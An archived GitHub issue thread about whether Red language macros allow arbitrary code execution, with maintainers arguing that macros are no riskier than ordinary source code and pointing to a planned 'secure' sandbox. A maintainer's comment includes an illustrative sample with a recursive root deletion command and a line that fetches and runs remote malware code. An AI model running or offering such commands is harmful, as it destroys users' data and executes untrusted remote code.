
#3216: Arbitrary Code Execution in Red macros?
================================================================================
Issue is closed, was reported by iceflow19 and has 24 comment(s).
[status.dismissed]
<https://github.com/red/red/issues/3216>

While I know this may be a tad premature to worry about things like this with since Red is still alpha, but I have no doubt this topic would have come up at some point. Since neither the Red nor the Rebol runtime running the macros are sandboxed, all it takes is a malicious source code file to allow for remote code exploits. See attached code, you can both access remote internet resources and executed shell code locally, more than enough to make a machine vulnerable.

What are the dev team's plans on this matter. Is there any way to combat this currently or will it take running the compiler fully on Red to address this?

```red
Red []
#do [
    write %test.out read http://www.json.org/
    call/output [dir %/c/windows] %test2.out
]
```


Comments:
--------------------------------------------------------------------------------

On 2018-02-02T15:09:07Z, dockimbel, commented:
<https://github.com/red/red/issues/3216#issuecomment-362611986>

    A Red macro is just Red or Rebol code evaluated at compile time (or at runtime when called from interpreter). Red macros are part of your source code, so you are already running arbitrary code (if you are not the source code author).
    
    In your above example, the `#do` forces the evaluation of the argument block at preprocessing time. If you remove `#do [...]` wrapping, it will run the same code at run-time. Why do you think macros present a particular threat compared to "regular" code?

--------------------------------------------------------------------------------

On 2018-02-04T21:39:25Z, iceflow19, commented:
<https://github.com/red/red/issues/3216#issuecomment-362942146>

    I am aware of the definition of a macro. My question is one of expectation and extent. Ignoring runtime preprocessing for right now, when one runs an executable there's the expectation of risk that comes with it. But with macros, I question if there is the same expectation. For programmers coming from other languages, I feel that they would assume that macros should **_only_** be able to act on the program's code.
    
    That gives an expectation of security to the compilation process, minus of course any build scripts that might be involved. When I compile a C program, I don't expect the compilation process to be able to do my taxes. I would think, macros should be either more sandboxed or more transparent to the user when they try to access resources outside of the scope of the code of the program upon which they're supposed to mutate.

--------------------------------------------------------------------------------

On 2018-02-04T22:03:37Z, greggirwin, commented:
<https://github.com/red/red/issues/3216#issuecomment-362943802>

    Sandboxing and security will come. Comparing to Lisp is better than comparing to C in Red's case.  Remember that Red is always data, and that inputs to a macro may not be your "program's code". It could be data scraped from, or generated somewhere else. If that data is tax rules combined with your personal information, where do we draw the line between what is done with preprocessing versus what is defined in the program? That is, what specifically should we disallow?

--------------------------------------------------------------------------------

On 2018-02-04T22:22:31Z, iceflow19, commented:
<https://github.com/red/red/issues/3216#issuecomment-362945242>

    @greggirwin Point taken. Red's macros are more powerful.
    
    >  It could be data scraped from, or generated somewhere else.
    
    My issue is more with the capacity to write and execute external resources, rather than read from them. Perhaps a compiler flag to allow for insecure macros or maybe something in the Red header? We don't have to necessarily default to just disallowing things.

--------------------------------------------------------------------------------

On 2018-02-05T06:12:14Z, greggirwin, commented:
<https://github.com/red/red/issues/3216#issuecomment-362990935>

    This is an interesting area. Macros execute in their own context, so we could potentially limit things to enforce security aspects, but it might be much more complex if you want to rule out *all* possible risks, because Red is so flexible. That is, if you just think of macros as all of Red executing at a different time, in a different context, as soon as you want to lock it down, you have to lock it down hard, which might make them far less useful. 
    
    Let's come back to the basic question of security. If we lock down macros, but you can still run Red, what have we gained? We should really set up docs, rules, and security features to you can't run untrusted code in either context with full authority, yes? 

--------------------------------------------------------------------------------

On 2018-02-05T19:26:52Z, BrianHoldsworth, commented:
<https://github.com/red/red/issues/3216#issuecomment-363193891>

    I feel like we should have already learned the lesson from previous sandboxed languages/runtimes that security is a system concern that can’t be adequately addressed in languages/runtimes. It’s a matter of education and diligence amongst programmers. The governing authority that manages the language/runtime can and should help, PRIMARILY through promotion of education and diligence amongst programmers.
    
    Programmers need to understand the default security model that Red (or any language/runtime) provides, but they don’t need it to be a particular model.
    
    > On Feb 5, 2018, at 1:12 AM, Gregg Irwin <notifications@github.com> wrote:
    > 
    > This is an interesting area. Macros execute in their own context, so we could potentially limit things to enforce security aspects, but it might be much more complex if you want to rule out all possible risks, because Red is so flexible. That is, if you just think of macros as all of Red executing at a different time, in a different context, as soon as you want to lock it down, you have to lock it down hard, which might make them far less useful.
    > 
    > Let's come back to the basic question of security. If we lock down macros, but you can still run Red, what have we gained? We should really set up docs, rules, and security features to you can't run untrusted code in either context with full authority, yes?
    > 
    > —
    > You are receiving this because you are subscribed to this thread.
    > Reply to this email directly, view it on GitHub <https://github.com/red/red/issues/3216#issuecomment-362990935>, or mute the thread <https://github.com/notifications/unsubscribe-auth/AAsoKB95qgAZ5ze7f8NXKxHZCoNoTkIAks5tRpvAgaJpZM4RvlUt>.
    > 
    

--------------------------------------------------------------------------------

On 2018-02-05T20:18:28Z, greggirwin, commented:
<https://github.com/red/red/issues/3216#issuecomment-363208573>

    Something we're learning as we look at the Red/C3 design, and lessons from Solidity, is that we should make it easy to be safe by default. If you step outside, it's up to you to know what you're doing.

--------------------------------------------------------------------------------

On 2018-02-05T20:29:30Z, BrianHoldsworth, commented:
<https://github.com/red/red/issues/3216#issuecomment-363211491>

    That's right. But you are talking about language requirements of Blockchain Programmers developing smart contracts. They will most likely expect a different default security model than other Red Programmers.
    
    As you are alluding to, it comes back to educating the programmers so they can understand and be appropriately diligent.
    
    My simplistic and naive understanding of Red/C3 is that it is a DSL implemented using Red. As such, it will be implicitly defined how and whether the Blockchain Programmer can "step outside" I.e. by extending the DSL, right? If so, then that is a good thing and an important "feature", because it will help guide programmer understanding about how to both stay in a safe "sandbox" and how/when they play outside of it.

--------------------------------------------------------------------------------

On 2018-02-05T21:24:33Z, greggirwin, commented:
<https://github.com/red/red/issues/3216#issuecomment-363226120>

    Red/C3 will be a DSL, yes, but it will likely be *very* tightly constrained, highly declarative, and not extensible. Not hard rules as the design is not set yet, but a primary goal there is security, which is different from Red, and it also has to run on blockchain VMs, which have very different execution environments. That is, it will compile to blockchain VM opcodes, limit runtime, and only access local state. Stepping outside moves into the realm of oracles, in blockchain parlance, which has yet to be determined as support for that varies by blockchain.

--------------------------------------------------------------------------------

On 2018-02-05T21:33:39Z, greggirwin, commented:
<https://github.com/red/red/issues/3216#issuecomment-363228598>

    If you're familiar with http://www.rebol.com/docs/words/wsecure.html, there will likely be inspiration drawn from that approach for Red.

--------------------------------------------------------------------------------

On 2018-02-05T23:01:58Z, BrianHoldsworth, commented:
<https://github.com/red/red/issues/3216#issuecomment-363251105>

    I think REBOL 'secure' is pretty nice. It is easy to understand and use.
    
    But to the point of the OP, nothing in the one page Doc that is linked educates the programmer as to the perils of 'secure' if the environment/system that their Red app inhabits allows code injection attacks.

--------------------------------------------------------------------------------

On 2018-03-16T09:48:57Z, dockimbel, commented:
<https://github.com/red/red/issues/3216#issuecomment-373659278>

    I wanted to dismiss this ticket from the first time I read it, because it wrongly considers macros as a "security threat" greater than the rest of the source code, without providing any evidence to back up such claim (has it anything to do with confusing language macros with MS Office macros threat?). I left it open to see if new elements would be brought up to justify the initial statement, but I have seen none.
    
    Let's consider the following code sample:
    ```
    Red []
    #do [print "I'm a macro"]
    
    call "rm -Rf /"
    do http://domain.com/malware.red
    ```
    Should we restrict macros in any way when regular code can run arbitrary (harmful) code? This would make no sense. Macros doing I/O is very useful, as they can be required to pull online resources or check online info during the compilation process (not mentioning reading local spec files or generating intermediary/temporay files on disk).
    
    Let me repeat it: _macros provide the same level of security as the rest of the source code. There is no way to "inject" malicious code, nor use any other harmful attack, that you can't achieve woth regular code._  If you can modify something (source files or anything on your OS) from macros, you can do the same with regular code. Therefore, it's pointless to restrict macros _specifically_.
    
    We plan (since the beginning of the project) to add a `secure` dialect in Red, starting in a 0.7.x release. At that point, you'll be able to sandbox to some extent your Red runtime code _and_ Red macros. It would not make sense to sandbox one without the other (though, they could use different levels of sandboxing in a given source, depending on the app building or running needs).
    
    

